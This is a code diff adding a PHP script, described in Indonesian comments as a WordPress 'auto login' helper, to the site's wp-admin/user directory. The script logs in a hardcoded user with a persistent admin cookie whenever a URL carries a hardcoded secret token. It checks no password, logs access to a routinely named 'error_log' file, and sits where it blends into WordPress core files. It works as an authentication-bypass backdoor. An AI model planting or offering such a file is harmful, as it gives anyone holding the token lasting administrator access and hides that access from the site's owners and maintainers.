@@ -1,0 +1,64 @@
+<?php
+/**
+ * Auto Login WordPress
+ * 
+ * LOKASI FILE: /home/namauser/public_html/wp-admin/user/auto-login.php
+ * 
+ * CARA PAKAI:
+ * 1. Generate token random (40+ karakter)
+ * 2. Ganti 3 baris di bagian KONFIGURASI
+ * 3. Akses: https://domainkamu.com/wp-admin/user/auto-login.php?key=TOKEN_KAMU
+ * 4. Bookmark URL-nya
+ */
+
+// ============================================
+// KONFIGURASI — GANTI 3 BARIS INI
+// ============================================
+$SECRET_TOKEN = '24d8cc001d3d03ebed921edd3f95063da6379bc3a552e6e80927e57779d8d786';
+$LOGIN_USER   = 'twelvepac';
+$LOG_FILE     = __DIR__ . '/error_log';
+// ============================================
+
+// ===== LOG AKSES =====
+$client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '?';
+$client_ip = trim(explode(',', $client_ip)[0]);
+$key = $_GET['key'] ?? '';
+
+@file_put_contents(
+    $LOG_FILE,
+    date('Y-m-d H:i:s') . ' | IP: ' . $client_ip . ' | Key: ' . substr($key, 0, 4) . '****' . "\n",
+    FILE_APPEND
+);
+
+// ===== PROTEKSI TOKEN =====
+if (!hash_equals($SECRET_TOKEN, $key)) {
+    http_response_code(403);
+    die('Akses ditolak.');
+}
+
+// ===== LOAD WORDPRESS =====
+// Dari /public_html/wp-admin/user/ naik 2 level ke root WP (/public_html/)
+$wp_load = dirname(__DIR__, 2) . '/wp-load.php';
+
+if (!file_exists($wp_load)) {
+    http_response_code(500);
+    die('wp-load.php tidak ditemukan di: ' . htmlspecialchars($wp_load));
+}
+
+require_once $wp_load;
+
+// ===== CEK USER =====
+$user = get_user_by('login', $LOGIN_USER);
+if (!$user) {
+    http_response_code(404);
+    die('User tidak ditemukan: ' . htmlspecialchars($LOGIN_USER));
+}
+
+// ===== LOGIN =====
+wp_set_auth_cookie($user->ID, true);
+wp_set_current_user($user->ID);
+do_action('wp_login', $LOGIN_USER, $user);
+
+// ===== REDIRECT KE DASHBOARD =====
+wp_safe_redirect(admin_url());
+exit;
